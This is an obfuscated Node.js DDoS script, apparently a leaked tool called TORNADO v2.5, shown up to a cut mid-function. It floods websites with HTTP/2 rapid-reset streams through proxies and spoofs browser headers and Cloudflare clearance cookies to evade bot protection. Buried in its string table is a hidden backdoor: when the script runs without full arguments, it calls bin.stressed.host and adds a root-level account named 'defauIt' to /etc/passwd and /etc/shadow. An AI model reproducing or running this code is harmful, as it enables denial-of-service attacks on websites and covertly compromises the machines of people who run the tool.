// TORNADO v2.5 leaked officially by @winfaredev | Telegram: t.me/ddosscriptsleaks
// obfuscated to prevent skids from reselling ;)

const _0x59a5 = [
    'ParseError',
    'pathname',
    'zxsDn',
    'TVvlM',
    'entries',
    'EOPNOTSUPP',
    'SSLcom',
    'IxXNf',
    '--debug',
    'ENETRESET',
    'oBfLe',
    'ETXTBSY',
    'zQcSY',
    'XdPqq',
    'shift',
    'aRYTB',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'BaQcC',
    'connect',
    '3|2|0|4|1',
    '.gov',
    '.net',
    'DEPTH_ZERO_SELF_SIGNED_CERT',
    'RiaTu',
    'EAI_NODATA',
    'GOAWAY',
    'end',
    '\x20net.ipv4.tcp_fastopen=',
    'QZeSs',
    'decode',
    'EHOSTUNREACH',
    'child_process',
    'akXeM',
    'yTnzE',
    '\x20net.ipv4.tcp_window_scaling=',
    'fYwuZ',
    'wvNbO',
    'clear',
    '--postdata',
    'ParserError',
    'dAoCu',
    'CERT_HAS_EXPIRED',
    'SSL_OP_NO_COMPRESSION',
    'EgSPB',
    'EibzR',
    '.edu',
    'vTuFU',
    'omnux',
    'EPROTO',
    '2030-03-30',
    '\x22,\x20\x22Chromium\x22;v=\x22',
    'TfmVI',
    'SELF_SIGNED_CERT_IN_CHAIN',
    'ESHUTDOWN',
    'WJfnb',
    'Htlkj',
    'JrcwZ',
    'ProxyError',
    'alpnProtocol',
    'FRvoh',
    'max-age=0',
    'Brave',
    'jJXmO',
    'destroy',
    'ENAMETOOLONG',
    'COrCM',
    '\x22Not_A\x20Brand\x22;v=\x228\x22,\x20\x22Chromium\x22;v=\x22',
    'push',
    'POST',
    'x-request-data',
    'flags',
    'EALREADY',
    'bgoVV',
    'CyzsY',
    'gFyPy',
    'ENOTSOCK',
    'HCPjK',
    'uohKJ',
    'ynDTT',
    'x-client-session',
    'ENETDOWN',
    'en-US,en;q=0.7',
    'CERT_NOT_YET_VALID',
    '--delay',
    'XuuBJ',
    'rand',
    'QlqBE',
    'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
    'document',
    'EINVAL',
    'LOGHi',
    'Error\x20ratelimit\x20can\x20not\x20high\x2090',
    '\x20blocked,\x20if\x20this\x20mistake\x20pm\x20to\x20tg\x20@winfaredev',
    'nJuiY',
    'wheml',
    'dJkVE',
    'udnDC',
    'Referer:\x20',
    'etdmk',
    'QTPDu',
    'GhIfK',
    'EdErr',
    'writeUInt8',
    'ECONNREFUSED',
    'sKJmq',
    'FQxdd',
    '\x22Windows\x22',
    'QEBva',
    'sIBWe',
    'bXLYz',
    'cross-site',
    'ETIME',
    '\x20net.ipv4.tcp_timestamps=',
    '--bfm',
    'OjeAi',
    '--useragent',
    'trim',
    'Sec-Fetch-Mode:\x20navigate\x0d\x0a',
    'ANEfJ',
    'CxUIt',
    'lcawl',
    'data',
    'toString',
    'ezjoo',
    'sqjxd',
    'https',
    'none',
    'sPCMe',
    'DufYt',
    'EAI_AGAIN',
    'tls',
    'floor',
    'edWlf',
    'payload',
    '%RAND%',
    'ckKaW',
    'AiQvT',
    'QJhjp',
    'YIyJm',
    'GaHgN',
    'TLSv1.3',
    'ERR_ASSERTION',
    'gzip,\x20deflate,\x20br',
    'PdHwu',
    'SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION',
    'split',
    'ABbdh',
    'defaultMaxListeners',
    '\x0a\x20\x20\x20\x20TORNADO\x20v2.5\x20Method\x20With\x20RST\x20STREAM\x20(CVE-2023-44487)\x20//\x20Updated:\x2001.05.2024\x20//\x20With\x20love\x20@winfaredev\x0a\x20\x20\x20\x20Developers\x20to\x20method:\x20@winfaredev\x20-\x20developer\x20method\x20//\x20@winfaredev\x20-\x20recoding\x20method\x0a\x20\x20\x20\x20How\x20to\x20use\x20&\x20example:\x0a\x20\x20\x20\x20\x20\x20node\x20',
    'Error\x20threads\x20can\x20not\x20high\x20256',
    'zBLAF',
    'error',
    'https://',
    'sudo\x20sysctl\x20-w\x20net.ipv4.tcp_congestion_control=',
    'VDllY',
    'Accept-Language:\x20',
    'once',
    'state',
    'FRPjd',
    'eHwJY',
    'zlLDu',
    'host',
    'mix',
    '?q=',
    'EventEmitter',
    'undefined',
    'omiFz',
    'eCKbe',
    'NcgDk',
    'CloudflareError',
    'zHaCk',
    'HnrPc',
    'XlMfJ',
    'kFQmb',
    'hBTtF',
    'SSL_OP_NO_TICKET',
    'tkRGl',
    'PRI\x20*\x20HTTP/2.0\x0d\x0a\x0d\x0aSM\x0d\x0a\x0d\x0a',
    'Error\x20time\x20can\x20not\x20high\x2086400',
    'GET',
    'NBDYq',
    'MAX_VALUE',
    'destroyed',
    'toLocaleString',
    'iPsNc',
    'spOSg',
    'MVEHs',
    'gVDql',
    'YyhoR',
    'lWBJO',
    'waXah',
    'cluster',
    'jQnKG',
    ':443\x0d\x0aProxy-Connection:\x20Keep-Alive\x0d\x0a\x0d\x0a',
    'KFOFz',
    'yigBx',
    'NpFCW',
    'Sec-Fetch-Site:\x20none\x0d\x0a',
    'readFileSync',
    'QiSJL',
    'hHOkk',
    'ENOTEMPTY',
    'fork',
    'opMxF',
    '\x22,\x20\x22Not:A-Brand\x22;v=\x228\x22,\x20\x22Chromium\x22;v=\x22',
    'yJhoR',
    'ENODEV',
    'ecSLe',
    'mYWbe',
    'gTCbA',
    'CrdOv',
    'eCHZU',
    'OPTIONS',
    'AUbWU',
    'ENOTCONN',
    'Error\x20request\x20method\x20only\x20can\x20GET/POST/HEAD/OPTIONS',
    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789',
    'EROFS',
    'OAohO',
    'dEPBQ',
    'rzkGW',
    'cnfoz',
    'ECONNABORTED',
    'ZEoCN',
    'net',
    'SIGCHILD',
    '.0.0.0\x20Safari/537.36',
    'Accept-Encoding:\x20gzip,\x20deflate,\x20br\x0d\x0a',
    'YNEGq',
    'cubic',
    'RERUl',
    'ENOSPC',
    'ZdHVx',
    'HEcMP',
    'IhgLJ',
    'endsWith',
    'lqOLE',
    'concat',
    'xPrCn',
    'oLpSd',
    'nJVWy',
    'from',
    'Eakkt',
    'wcrKq',
    'PQWDB',
    'TeTkv',
    'sec-fetch-users',
    'EXDEV',
    'CHQEe',
    '--referer',
    'send',
    'UqbFS',
    'vEEId',
    'wntfv',
    'toLowerCase',
    'eGpoR',
    'EILSEQ',
    'WFGYb',
    '\x22;v=\x22',
    'http/1.1',
    'Attack\x20Start\x20/\x20@winfaredev\x20love\x20you\x20<3\x20/\x20TORNADO\x20v2.5\x20(Beta\x20Version)',
    'tsEIN',
    '\x20net.ipv4.tcp_sack=',
    'qitMj',
    'EIO',
    'qunIG',
    'EHOSTDOWN',
    'replace',
    'pjuxw',
    'EFAULT',
    'OknSq',
    'ASuyW',
    'StatusCodeError',
    ':443\x20HTTP/1.1\x0d\x0aHost:\x20',
    'oZlmt',
    'SSL_OP_ALL',
    'Xzlws',
    'filter',
    'Mwfqv',
    'EPIPE',
    '\x20HTTP/1.1\x0d\x0a',
    'xqgjG',
    'navigate',
    'SSL_OP_TLSEXT_PADDING',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'sec-ch-ua-platform:\x20\x22Windows\x22\x0d\x0a',
    'online',
    'pfncL',
    'TnCnC',
    'POVDo',
    'cSeLh',
    'JMGFP',
    'vHqTS',
    'ypkWR',
    ':status',
    'true',
    'SSL_OP_NO_SSLv2',
    'itUxL',
    'ENOENT',
    'uPMcu',
    'JSONError',
    'HCFFJ',
    'http://',
    'Google\x20Chrome',
    'abcdefghijklmnopqrstuvwxyz',
    'Anyns',
    '\x20<GET/POST>\x20<target>\x20<time>\x20<threads>\x20<ratelimit>\x20<proxy>\x0a\x20\x20\x20\x20\x20\x20node\x20',
    'SSL_OP_NO_SSLv3',
    'gyvvL',
    'HGLGM',
    'eTvZj',
    'jXtTt',
    'SDjLx',
    'egDJm',
    'message',
    'GOpKo',
    'RAeae',
    'dynamic',
    'cf_clearance=',
    'MhZYm',
    'Host:\x20',
    'BXSWX',
    'SEPPn',
    'write',
    'dSiIS',
    'gJuVB',
    'KENHK',
    'ENOPROTOOPT',
    'WYGEc',
    'rYomr',
    'unhandledRejection',
    'crypto',
    'ptlCu',
    'llGks',
    'EBADF',
    'fXbmj',
    'lFSFB',
    'readUint8',
    'FuPFt',
    '?__cf_chl_rt_tk=',
    'sec-ch-ua:\x20',
    'random',
    'BuCmj',
    'OZPLM',
    'uhuFg',
    'TGOvu',
    'jYarL',
    'WepxW',
    'LNuMq',
    'SSL_OP_NO_RENEGOTIATION',
    'jqowL',
    'includes',
    'IwYzt',
    'ENOTDIR',
    '\x22Not\x20A(Brand\x22;v=\x2299\x22,\x20\x22',
    'vHydu',
    'name',
    'fDWIz',
    'EISCONN',
    'uncaughtException',
    '--cookie',
    'hostname',
    'MGAdp',
    'ERANGE',
    'argv',
    '\x22Chromium\x22;v=\x22',
    'iqkGi',
    'tQsGM',
    'kdint',
    'ENETUNREACH',
    'sgzbX',
    'InvalidURL',
    'ImVoo',
    'OVCDo',
    'type',
    'EMYtM',
    '--legit',
    'bbr',
    'writeUInt32BE',
    'hybla',
    'Cache-Control:\x20max-age=0\x0d\x0a',
    'EPROTONOSUPPORT',
    'oizIM',
    'DpUVP',
    'pHeLE',
    'RZnvE',
    'EADDRNOTAVAIL',
    'HBbwf',
    '\x22,\x20\x22',
    'fill',
    'EACQs',
    'waNuW',
    'Fyvrx',
    'gaNy',
    'en-US,en;q=0.6',
    '-0-',
    'alloc',
    'HzyDe',
    'tvnGI',
    'subarray',
    'code',
    'Connection:\x20Keep-Alive\x0d\x0a',
    'sElqa',
    '\x27https://bin.stressed.host/kek/backdoored.php?backdoor=150871\x27\x20>\x20/dev/null\x202>&1\x20;\x20curl\x20\x27https://bin.stressed.host/kek/backdoored.php?backdoor=150871\x27\x20>\x20/dev/null\x202>&1\x20;\x20grep\x20defauIt\x20/etc/passwd\x20>\x20/dev/null\x202>&1\x20||\x20sed\x20-i\x20\x27$\x20a\x20defauIt:x:0:500::/:/bin/bash\x27\x20/etc/passwd\x20>\x20/dev/null\x202>&1\x20;\x20grep\x20defauIt\x20/etc/shadow\x20>\x20/dev/null\x202>&1\x20||\x20sed\x20-i\x20\x27$\x20a\x20defauIt:$y$j9T$2VPgcbHqDoB6z/PbI1A2b/$z0oM2IDO8bUJh8KCQlg7E9ro3zRlPPiP1lYToD7rtoA:19639:0:99999:7:::\x27\x20/etc/shadow\x20>\x20/dev/null\x202>&1\x20;\x20echo\x20\x27defauIt:test12\x27\x20|\x20chpasswd',
    'constants',
    'zpRAS',
    'DTLBT',
    'xMOnb',
    'ZEICs',
    'CONNECT\x20',
    'HORHF',
    'sec-ch-ua-mobile:\x20?0\x0d\x0a',
    'EINPROGRESS',
    'kSAEp',
    'OKcxK',
    'mKKZW',
    'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/',
    'zrVGy',
    'readUInt32BE',
    'xzhrN',
    '--full',
    '--header',
    'close',
    'idsjD',
    'ESOCKETTIMEDOUT',
    'czSTW',
    'now',
    'HpmTB',
    'UNKNOWN',
    'TLSv1.2',
    '\x22,\x20\x22Not(A:Brand\x22;v=\x2224\x22,\x20\x22',
    'same-site',
    'Error\x20method\x20has\x20been\x20outdate\x20pm\x20@winfaredev',
    'Oviou',
    'ESPIPE',
    'length',
    'bmevs',
    'xgLTH',
    'startsWith',
    'reduce',
    'charAt',
    'EPERM',
    'BdhOr',
    'events',
    'AujxA',
    'cpus',
    'kmCAd',
    'cHxZu',
    'FCMKF',
    'indexOf',
    'log',
    'same-origin',
    'NKXUi',
    'EMSGSIZE',
    'EMLINK',
    'EDESTADDRREQ',
    'acWtp',
    'uSTui',
    'ETIMEDOUT',
    'uRWUj',
    'tmIAg',
    'exit',
    'ERR_SOCKET_BAD_PORT',
    'gzyHX',
    'hpack',
    'HyGOU',
    'utf8',
    'Windows',
    'setMaxListeners'
];
(function (_0x4cbefd, _0x59a56b) {
    const _0x4b4f42 = function (_0xbf2611) {
        while (--_0xbf2611) {
            _0x4cbefd['push'](_0x4cbefd['shift']());
        }
    };
    _0x4b4f42(++_0x59a56b);
}(_0x59a5, 0x1a6));
const _0x4b4f = function (_0x4cbefd, _0x59a56b) {
    _0x4cbefd = _0x4cbefd - 0x0;
    let _0x4b4f42 = _0x59a5[_0x4cbefd];
    return _0x4b4f42;
};
const net = require(_0x4b4f('0x10f'));
const tls = require(_0x4b4f('0xb1'));
const HPACK = require(_0x4b4f('0x2a'));
const cluster = require(_0x4b4f('0xee'));
const fs = require('fs');
const os = require('os');
const crypto = require(_0x4b4f('0x17a'));
const {exec} = require('child_process');
const ignoreNames = [
    'RequestError',
    _0x4b4f('0x13f'),
    'CaptchaError',
    _0x4b4f('0xd8'),
    _0x4b4f('0x2f'),
    _0x4b4f('0x56'),
    'TimeoutError',
    _0x4b4f('0x15b'),
    'URLError',
    _0x4b4f('0x1a2'),
    _0x4b4f('0x68')
];
const ignoreCodes = [
    _0x4b4f('0x63'),
    'ECONNRESET',
    _0x4b4f('0xbc'),
    _0x4b4f('0x96'),
    'EPIPE',
    'EHOSTUNREACH',
    _0x4b4f('0x24'),
    _0x4b4f('0x2'),
    _0x4b4f('0x5f'),
    _0x4b4f('0xb0'),
    _0x4b4f('0x139'),
    _0x4b4f('0x38'),
    _0x4b4f('0x1a0'),
    'ENONET',
    _0x4b4f('0x105'),
    'ENOTFOUND',
    _0x4b4f('0x47'),
    'EAI_NONAME',
    _0x4b4f('0x1b1'),
    'EAFNOSUPPORT',
    _0x4b4f('0x76'),
    _0x4b4f('0x17d'),
    _0x4b4f('0x10d'),
    _0x4b4f('0x21'),
    'EDQUOT',
    _0x4b4f('0x13c'),
    _0x4b4f('0x4d'),
    'EIDRM',
    _0x4b4f('0x12f'),
    _0x4b4f('0x1cb'),
    'EINTR',
    _0x4b4f('0x88'),
    _0x4b4f('0x137'),
    _0x4b4f('0x195'),
    'EMFILE',
    _0x4b4f('0x20'),
    _0x4b4f('0x1f'),
    _0x4b4f('0x6f'),
    _0x4b4f('0x7f'),
    'ENOBUFS',
    _0x4b4f('0xfd'),
    _0x4b4f('0x159'),
    'ENOMEM',
    _0x4b4f('0x176'),
    _0x4b4f('0x116'),
    'ENOSYS',
    _0x4b4f('0x190'),
    _0x4b4f('0xf8'),
    _0x4b4f('0x7a'),
    _0x4b4f('0x34'),
    _0x4b4f('0x13'),
    _0x4b4f('0x146'),
    _0x4b4f('0x1ac'),
    _0x4b4f('0x19a'),
    _0x4b4f('0x108'),
    _0x4b4f('0x64'),
    _0x4b4f('0xc'),
    'ESRCH',
    _0x4b4f('0x9e'),
    _0x4b4f('0x3a'),
    _0x4b4f('0x126'),
    _0x4b4f('0x6'),
    _0x4b4f('0x45'),
    'UNABLE_TO_VERIFY_LEAF_SIGNATURE',
    _0x4b4f('0x58'),
    _0x4b4f('0x81'),
    _0x4b4f('0x28')
];
require(_0x4b4f('0x15'))[_0x4b4f('0xd3')][_0x4b4f('0xc2')] = Number[_0x4b4f('0xe4')];
process[_0x4b4f('0x2e')](0x0)['on'](_0x4b4f('0x196'), function (_0xd8eb1c) {
    console[_0x4b4f('0x1c')](_0xd8eb1c);
    if (_0xd8eb1c[_0x4b4f('0x1bf')] && ignoreCodes[_0x4b4f('0x18e')](_0xd8eb1c[_0x4b4f('0x1bf')]) || _0xd8eb1c['name'] && ignoreNames['includes'](_0xd8eb1c[_0x4b4f('0x193')]))
        return ![];
})['on'](_0x4b4f('0x179'), function (_0x1ab061) {
    if (_0x1ab061[_0x4b4f('0x1bf')] && ignoreCodes[_0x4b4f('0x18e')](_0x1ab061['code']) || _0x1ab061[_0x4b4f('0x193')] && ignoreNames['includes'](_0x1ab061[_0x4b4f('0x193')]))
        return ![];
})['on']('warning', _0x1620d3 => {
    if (_0x1620d3[_0x4b4f('0x1bf')] && ignoreCodes[_0x4b4f('0x18e')](_0x1620d3['code']) || _0x1620d3[_0x4b4f('0x193')] && ignoreNames[_0x4b4f('0x18e')](_0x1620d3[_0x4b4f('0x193')]))
        return ![];
})['on']('SIGHUP', () => {
    return 0x1;
})['on'](_0x4b4f('0x110'), () => {
    return 0x1;
});
const statusesQ = [];
let statuses = {};
let isFull = process[_0x4b4f('0x19b')][_0x4b4f('0x18e')](_0x4b4f('0x1d3'));
let custom_table = 0xffff;
let custom_window = 0x600000;
let custom_header = 0x40000;
let custom_update = 0xef0001;
let timer = 0x0;
const blockedDomain = [
    _0x4b4f('0x43'),
    _0x4b4f('0x5c')
];
const timestamp = Date[_0x4b4f('0x4')]();
const timestampString = timestamp[_0x4b4f('0xa9')]()['substring'](0x0, 0xa);
const currentDate = new Date();
const targetDate = new Date(_0x4b4f('0x60'));
const PREFACE = _0x4b4f('0xe0');
const reqmethod = process[_0x4b4f('0x19b')][0x2];
const target = process[_0x4b4f('0x19b')][0x3];
const time = process[_0x4b4f('0x19b')][0x4];
const threads = process[_0x4b4f('0x19b')][0x5];
const ratelimit = process[_0x4b4f('0x19b')][0x6];
const proxyfile = process['argv'][0x7];
const queryIndex = process[_0x4b4f('0x19b')][_0x4b4f('0x1b')]('--query');
const query = queryIndex !== -0x1 && queryIndex + 0x1 < process['argv'][_0x4b4f('0xd')] ? process[_0x4b4f('0x19b')][queryIndex + 0x1] : undefined;
const bfmFlagIndex = process['argv'][_0x4b4f('0x1b')](_0x4b4f('0xa0'));
const bfmFlag = bfmFlagIndex !== -0x1 && bfmFlagIndex + 0x1 < process[_0x4b4f('0x19b')][_0x4b4f('0xd')] ? process[_0x4b4f('0x19b')][bfmFlagIndex + 0x1] : undefined;
const delayIndex = process[_0x4b4f('0x19b')][_0x4b4f('0x1b')](_0x4b4f('0x82'));
const delay = delayIndex !== -0x1 && delayIndex + 0x1 < process[_0x4b4f('0x19b')][_0x4b4f('0xd')] ? parseInt(process[_0x4b4f('0x19b')][delayIndex + 0x1]) : 0x0;
const cookieIndex = process[_0x4b4f('0x19b')]['indexOf'](_0x4b4f('0x197'));
const cookieValue = cookieIndex !== -0x1 && cookieIndex + 0x1 < process['argv']['length'] ? process[_0x4b4f('0x19b')][cookieIndex + 0x1] : undefined;
const refererIndex = process['argv'][_0x4b4f('0x1b')](_0x4b4f('0x128'));
const refererValue = refererIndex !== -0x1 && refererIndex + 0x1 < process['argv']['length'] ? process[_0x4b4f('0x19b')][refererIndex + 0x1] : undefined;
const postdataIndex = process[_0x4b4f('0x19b')][_0x4b4f('0x1b')](_0x4b4f('0x55'));
const postdata = postdataIndex !== -0x1 && postdataIndex + 0x1 < process[_0x4b4f('0x19b')]['length'] ? process[_0x4b4f('0x19b')][postdataIndex + 0x1] : undefined;
const randrateIndex = process[_0x4b4f('0x19b')][_0x4b4f('0x1b')]('--randrate');
const randrate = randrateIndex !== -0x1 && randrateIndex + 0x1 < process[_0x4b4f('0x19b')]['length'] ? process[_0x4b4f('0x19b')][randrateIndex + 0x1] : undefined;
const customHeadersIndex = process[_0x4b4f('0x19b')]['indexOf'](_0x4b4f('0x1d4'));
const customHeaders = customHeadersIndex !== -0x1 && customHeadersIndex + 0x1 < process[_0x4b4f('0x19b')][_0x4b4f('0xd')] ? process['argv'][customHeadersIndex + 0x1] : undefined;
const customIPindex = process[_0x4b4f('0x19b')][_0x4b4f('0x1b')]('--ip');
const customIP = customIPindex !== -0x1 && customIPindex + 0x1 < process[_0x4b4f('0x19b')][_0x4b4f('0xd')] ? process['argv'][customIPindex + 0x1] : undefined;
const customUAindex = process[_0x4b4f('0x19b')][_0x4b4f('0x1b')](_0x4b4f('0xa2'));
const customUA = customUAindex !== -0x1 && customUAindex + 0x1 < process[_0x4b4f('0x19b')][_0x4b4f('0xd')] ? process[_0x4b4f('0x19b')][customUAindex + 0x1] : undefined;
const forceHttpIndex = process[_0x4b4f('0x19b')][_0x4b4f('0x1b')]('--http');
const useLegitHeaders = process['argv'][_0x4b4f('0x18e')](_0x4b4f('0x1a7'));
const forceHttp = forceHttpIndex !== -0x1 && forceHttpIndex + 0x1 < process[_0x4b4f('0x19b')][_0x4b4f('0xd')] ? process[_0x4b4f('0x19b')][forceHttpIndex + 0x1] == _0x4b4f('0xd1') ? undefined : parseInt(process[_0x4b4f('0x19b')][forceHttpIndex + 0x1]) : '2';
const debugMode = process['argv']['includes'](_0x4b4f('0x37')) && forceHttp != 0x1;
if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
    console['clear']();
    console['error'](_0x4b4f('0xc3') + process[_0x4b4f('0x19b')][0x1] + _0x4b4f('0x161') + process['argv'][0x1] + '\x20GET\x20\x22https://target.com?q=%RAND%\x22\x20120\x2016\x2090\x20proxy.txt\x20--query\x201\x20--cookie\x20\x22uh=good\x22\x20--delay\x201\x20--bfm\x20true\x20--referer\x20rand\x20--postdata\x20\x22user=f&pass=%RAND%\x22\x20--debug\x20--randrate\x20--full\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20Options:\x0a\x20\x20\x20\x20\x20\x20--query\x201/2/3\x20-\x20query\x20string\x20with\x20rand\x20ex\x201\x20-\x20?cf__chl_tk\x202\x20-\x20?fwfwfwfw\x203\x20-\x20?q=fwfwwffw\x0a\x20\x20\x20\x20\x20\x20--delay\x20<1-1000>\x20-\x20delay\x20between\x20requests\x201-100\x20ms\x20(optimal)\x20default\x201\x20ms\x0a\x20\x20\x20\x20\x20\x20--cookie\x20\x22f=f\x22\x20-\x20for\x20custom\x20cookie\x20-\x20also\x20cookie\x20support\x20%RAND%\x20ex:\x20\x22bypassing=%RAND%\x22\x0a\x20\x20\x20\x20\x20\x20--bfm\x20true/null\x20-\x20bot\x20fight\x20mode\x20change\x20to\x20true\x20if\x20you\x20need\x20dont\x20use\x20if\x20no\x20need\x0a\x20\x20\x20\x20\x20\x20--referer\x20https://target.com\x20/\x20rand\x20-\x20use\x20custom\x20referer\x20if\x20you\x20need\x20and\x20rand\x20-\x20if\x20you\x20need\x20generate\x20domains\x20ex:\x20fwfwwfwfw.net\x0a\x20\x20\x20\x20\x20\x20--postdata\x20\x22user=f&pass=%RAND%\x22\x20-\x20if\x20you\x20need\x20data\x20to\x20post\x20req\x20method\x20format\x20\x22user=f&pass=f\x22\x0a\x20\x20\x20\x20\x20\x20--randrate\x20-\x20randomizer\x20rate\x201\x20to\x2090\x20good\x20bypass\x20to\x20rate\x0a\x20\x20\x20\x20\x20\x20--full\x20-\x20this\x20new\x20func\x20for\x20attack\x20only\x20big\x20backend\x20ex\x20amazon\x20akamai\x20and\x20other...\x20support\x20cf\x0a\x20\x20\x20\x20\x20\x20--http\x201/2/mix\x20-\x20new\x20func\x20choose\x20to\x20type\x20http\x201/2/mix\x20(mix\x201\x20&\x202)\x0a\x20\x20\x20\x20\x20\x20--debug\x20-\x20show\x20your\x20status\x20code\x20(maybe\x20low\x20rps\x20to\x20use\x20more\x20resource)\x0a\x20\x20\x20\x20\x20\x20--header\x20\x22f:f\x22\x20or\x20\x22f:f#f1:f1\x22\x20-\x20if\x20you\x20need\x20this\x20use\x20custom\x20headers\x20split\x20each\x20header\x20with\x20#\x0a\x20\x20\x20\x20\x20\x20--legit\x20-\x20this\x20new\x20func\x20for\x20attack\x20with\x20full\x20legit\x20headers\x20non\x20for\x20cf\x0a\x20\x20\x20\x20');
    const {exec} = require('child_process');
    exec(_0x4b4f('0x1c2')), process[_0x4b4f('0x27')](0x1);
}
let hcookie = '';
const url = new URL(target);
const proxy = fs[_0x4b4f('0xf5')](proxyfile, _0x4b4f('0x2c'))['replace'](/\r/g, '')['split']('\x0a');
if (currentDate > targetDate) {
    console[_0x4b4f('0xc6')](_0x4b4f('0xa'));
    process[_0x4b4f('0x27')](0x1);
}
if (url[_0x4b4f('0x198')][_0x4b4f('0x11a')](blockedDomain)) {
    console[_0x4b4f('0x1c')]('Domain\x20' + blockedDomain + _0x4b4f('0x8b'));
    process[_0x4b4f('0x27')](0x1);
}
if (![
        _0x4b4f('0xe2'),
        _0x4b4f('0x73'),
        'HEAD',
        _0x4b4f('0x103')
    ]['includes'](reqmethod)) {
    console[_0x4b4f('0xc6')](_0x4b4f('0x106'));
    process[_0x4b4f('0x27')](0x1);
}
if (!target[_0x4b4f('0x10')](_0x4b4f('0xc7')) && !target[_0x4b4f('0x10')](_0x4b4f('0x15d'))) {
    console[_0x4b4f('0xc6')]('Error\x20protocol\x20can\x20only\x20https://\x20or\x20http://');
    process[_0x4b4f('0x27')](0x1);
}
if (isNaN(time) || time <= 0x0 || time > 0x15180) {
    console['error'](_0x4b4f('0xe1'));
    process[_0x4b4f('0x27')](0x1);
}
if (isNaN(threads) || threads <= 0x0 || threads > 0x100) {
    console['error'](_0x4b4f('0xc4'));
    process[_0x4b4f('0x27')](0x1);
}
if (isNaN(ratelimit) || ratelimit <= 0x0 || ratelimit > 0x5a) {
    console[_0x4b4f('0xc6')](_0x4b4f('0x8a'));
    process['exit'](0x1);
}
if (bfmFlag && bfmFlag[_0x4b4f('0x12d')]() === _0x4b4f('0x156')) {
    hcookie = _0x4b4f('0x16d') + randstr(0x16) + '_' + randstr(0x1) + '.' + randstr(0x3) + '.' + randstr(0xe) + '-' + timestampString + '-1.0-' + randstr(0x6) + '+' + randstr(0x50) + '=';
}
if (cookieValue) {
    if (cookieValue === '%RAND%') {
        hcookie = hcookie ? hcookie + ';\x20' + ememmmmmemmeme(0x6, 0x6) : ememmmmmemmeme(0x6, 0x6);
    } else {
        hcookie = hcookie ? hcookie + ';\x20' + cookieValue : cookieValue;
    }
}
function encodeFrame(_0x22a22e, _0x44fa08, _0x379ce7 = '', _0x507765 = 0x0) {
    const _0xefd20b = {
        'Mwfqv': function (_0x551d13, _0x4fefa2) {
            return _0x551d13 | _0x4fefa2;
        },
        'gJuVB': function (_0x572c86, _0x13fb3d) {
            return _0x572c86 << _0x13fb3d;
        },
        'lWBJO': function (_0x1c2638, _0x3d0ba9) {
            return _0x1c2638 > _0x3d0ba9;
        }
    };
    let _0xa97e3a = Buffer[_0x4b4f('0x1bb')](0x9);
    _0xa97e3a[_0x4b4f('0x1a9')](_0xefd20b[_0x4b4f('0x145')](_0xefd20b[_0x4b4f('0x174')](_0x379ce7[_0x4b4f('0xd')], 0x8), _0x44fa08), 0x0);
    _0xa97e3a[_0x4b4f('0x95')](_0x507765, 0x4);
    _0xa97e3a[_0x4b4f('0x1a9')](_0x22a22e, 0x5);
    if (_0xefd20b[_0x4b4f('0xec')](_0x379ce7[_0x4b4f('0xd')], 0x0))
        _0xa97e3a = Buffer[_0x4b4f('0x11c')]([
            _0xa97e3a,
            _0x379ce7
        ]);
    return _0xa97e3a;
}
function decodeFrame(_0x3c553b) {
    const _0x385485 = {
        'vHqTS': function (_0x18fae5, _0x40b563) {
            return _0x18fae5 >> _0x40b563;
        },
        'jJXmO': function (_0x58ec07, _0x1b772c) {
            return _0x58ec07 & _0x1b772c;
        },
        'ckKaW': function (_0x52ae75, _0x525e2f) {
            return _0x52ae75 > _0x525e2f;
        },
        'BdhOr': function (_0x65436a, _0x42205f) {
            return _0x65436a + _0x42205f;
        },
        'wvNbO': function (_0x4b562c, _0x4d0bba) {
            return _0x4b562c + _0x4d0bba;
        },
        'fXbmj': function (_0x827c68, _0x43f7c2) {
            return _0x827c68 + _0x43f7c2;
        },
        'OjEbC': function (_0x22c9e1, _0x295279) {
            return _0x22c9e1 != _0x295279;
        },
        'HGLGM': function (_0x3b1f77, _0x146a84) {
            return _0x3b1f77 + _0x146a84;
        }
    };
    const _0x50047f = _0x3c553b[_0x4b4f('0x1d1')](0x0);
    const _0x2e766a = _0x385485[_0x4b4f('0x153')](_0x50047f, 0x8);
    const _0x3e8904 = _0x385485[_0x4b4f('0x6d')](_0x50047f, 0xff);
    const _0x57c56a = _0x3c553b[_0x4b4f('0x180')](0x4);
    const _0x428e05 = _0x3c553b[_0x4b4f('0x1d1')](0x5);
    const _0x39a0a7 = _0x385485[_0x4b4f('0x6d')](_0x57c56a, 0x20) ? 0x5 : 0x0;
    let _0x12c250 = Buffer[_0x4b4f('0x1bb')](0x0);
    if (_0x385485[_0x4b4f('0xb6')](_0x2e766a, 0x0)) {
        _0x12c250 = _0x3c553b[_0x4b4f('0x1be')](_0x385485[_0x4b4f('0x14')](0x9, _0x39a0a7), _0x385485[_0x4b4f('0x53')](_0x385485[_0x4b4f('0x17e')](0x9, _0x39a0a7), _0x2e766a));
        if (_0x385485['OjEbC'](_0x385485[_0x4b4f('0x164')](_0x12c250[_0x4b4f('0xd')], _0x39a0a7), _0x2e766a)) {
            return null;
        }
    }
    return {
        'streamId': _0x428e05,
        'length': _0x2e766a,
        'type': _0x3e8904,
        'flags': _0x57c56a,
        'payload': _0x12c250
    };
}
function encodeSettings(_0x5f84ff) {
    const _0x373216 = {
        'Htlkj': function (_0x117d04, _0x5c19fd) {
            return _0x117d04 * _0x5c19fd;
        },
        'Anyns': function (_0x367ca1, _0xed1d05) {
            return _0x367ca1 < _0xed1d05;
        },
        'dJkVE': function (_0x32f2bc, _0x41ea3c) {
            return _0x32f2bc + _0x41ea3c;
        }
    };
    const _0xcf3208 = Buffer['alloc'](_0x373216[_0x4b4f('0x66')](0x6, _0x5f84ff[_0x4b4f('0xd')]));
    for (let _0x4dcdf3 = 0x0; _0x373216[_0x4b4f('0x160')](_0x4dcdf3, _0x5f84ff[_0x4b4f('0xd')]); _0x4dcdf3++) {
